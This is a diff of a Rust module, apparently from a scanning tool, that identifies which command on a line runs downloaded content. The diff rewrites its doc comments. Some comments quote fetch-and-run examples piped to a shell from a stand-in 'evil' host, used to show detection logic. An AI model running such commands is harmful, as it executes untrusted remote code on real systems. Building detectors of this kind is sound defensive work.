@@ -3,21 +3,20 @@
 //! Split out of `content.rs` to stay under the file's line cap. Everything
 //! here answers one question — which command on this line actually runs
 //! what it downloaded, and how to name it — because a sentence that names
-//! the wrong one gives two different payloads one identity, and one
-//! dismissal then settles the one nobody saw.
+//! the wrong one gives two different payloads one sentence, and the reader
+//! learns about the one that never runs.
 
 use super::super::Line;
 
 /// What this line does, and what it does it to — so two lines that reach
-/// for two different things are two questions. A finding's identity is its
-/// rule and its sentence, and a sentence that says only "this line" is the
-/// same sentence wherever it fires: the person is shown one and settles
-/// both.
+/// for two different things are two sentences. A sentence that says only
+/// "this line" is the same sentence wherever it fires, and a reader shown
+/// one has no way to tell there is a second.
 ///
 /// Named from the line, never from the file it sits in: a file is something
 /// kendex's own rendering moves between (an over-cap body is split into
-/// `references/`), and an identity that moved with it would stop being the
-/// finding a decision was made about.
+/// `references/`), and a sentence naming it would change under a move the
+/// author never made.
 pub(super) struct Reach {
     what: &'static str,
     /// How the operand attaches to `what` — "from", "with", "out of",
@@ -109,7 +108,7 @@ pub(super) fn fetch_and_run(line: &Line) -> Option<Reach> {
         // Everything after the parenthesis, not the text up to the first
         // `)`: an argument that calls something closes a bracket of its
         // own, so cutting there gives `eval(f(x) + a)` and `eval(f(x) + b)`
-        // one sentence and one decision. Over-including never merges two
+        // one sentence. Over-including never merges two
         // different programs; cutting early does.
         operand: line.text[at + "eval(".len()..].trim().to_owned(),
     })
@@ -164,7 +163,7 @@ fn fetches(commands: &[Command]) -> Vec<usize> {
 /// is the last one written before it — not the first fetch on the line,
 /// which on `curl https://safe/a; wget https://evil/x | sh` is the one that
 /// never executes. Naming that one gives every line sharing its address one
-/// sentence and one decision, whatever each of them actually runs.
+/// sentence, whatever each of them actually runs.
 ///
 /// A line whose fetches all come after everything it runs is still named by
 /// what it fetches, and a line where nothing parses as a fetch command at
@@ -202,7 +201,7 @@ fn downloads(line: &Line, commands: &[Command], run: &[usize]) -> (&'static str,
 /// Both are read from this command's own arguments and never from the rest
 /// of the line. `echo https://docs; curl https://evil/a | sh` downloads the
 /// second address, and naming the first would give two lines running two
-/// different payloads one sentence, and therefore one decision.
+/// different payloads one sentence.
 ///
 /// The address only when the arguments name exactly one, because which
 /// token is the operand depends on the arity of every option before it.
@@ -232,7 +231,7 @@ fn fetched(command: &Command) -> (&'static str, String) {
 /// From the scheme to the end of the word, because the word is what the
 /// shell hands the command: a separator inside it was quoted, and cutting
 /// there would give `'https://host/p;v=1'` and `'https://host/p;v=2'` one
-/// address, one sentence and one decision.
+/// address and one sentence.
 ///
 /// A bare word loses the punctuation the sentence around it put there — a
 /// line of documentation writes an address inside brackets or ends one with
